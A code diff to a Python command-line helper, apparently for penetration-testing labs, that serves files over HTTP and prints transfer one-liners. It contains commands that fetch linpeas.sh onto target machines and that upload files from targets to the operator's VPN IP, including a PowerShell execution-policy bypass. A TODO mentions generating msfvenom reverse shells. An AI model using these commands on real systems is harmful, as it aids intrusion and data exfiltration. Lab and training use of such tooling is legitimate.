@@ -6,12 +6,6 @@ Built from: https://gist.github.com/darkr4y/761d7536100d2124f5d0db36d4890109
 '''
 
 import os
-try:
-    import http.server as server
-except ImportError:
-    # Handle Python 2.x
-    import SimpleHTTPServer as server
-
 import sys
 import argparse
 import socketserver
@@ -19,9 +13,13 @@ import cmd
 from threading import Thread
 import subprocess
 import time
+try:
+    import http.server as server
+except ImportError:
+    # Handle Python 2.x
+    import SimpleHTTPServer as server
 
 # gather vpn info
-
 try:
     result = subprocess.run(
         ['ifconfig', 'tun0'],
@@ -44,7 +42,6 @@ except subprocess.CalledProcessError:
         if 'inet ' in line:
             VPN_STATUS = "OFF"
             VPN_IP = line.split()[1]
-    
 print(f"VPN: {VPN_STATUS}")
 print(f"IP : {VPN_IP}")
 
@@ -126,13 +123,27 @@ class CLI(cmd.Cmd):
             print(f"wget {VPN_IP}:{PORT}/peas/linpeas.sh")
             print(f"curl -o linpeas.sh http://{VPN_IP}:{PORT}/peas/linpeas.sh")
 
+    # alias for downloads
+    def do_d(self,arg):
+        return self.do_downloads(arg)
+
     # show commands to upload to the server
     def do_uploads(self, arg):
-        "Display commands to upload to this server from different machines"
-        print("[*] Win upload command:")
+        "Display commands to upload to this server.\nUsage: uploads [PORT] [FILE]\n\tDefault port: 8000\n\tDefault filename: file.txt"
+        args = arg.split()
+        PORT = args[0] if len(args) > 0 else 8000
+        FILENAME = args[1] if len(args) > 1 else "file.txt"
         
-        print("Linux upload commands:")
+        print("[*] Win upload command:")
+        print(f"powershell -ep bypass -c \"(New-Object Net.WebClient).UploadFile('http://{VPN_IP}:{PORT}/{FILENAME}', 'PUT', '{FILENAME}');\"")
+        print("[*] Linux upload commands:")
+        print(f"curl -X PUT -T \"{FILENAME}\" \"http://{VPN_IP}:{PORT}/{FILENAME}\"")
         return
+
+    # alias for uploads
+    def do_u(self,arg):
+        return self.do_uploads(arg)
+
 
     # todo - run msfvenom and place revshell in revshells dir
 
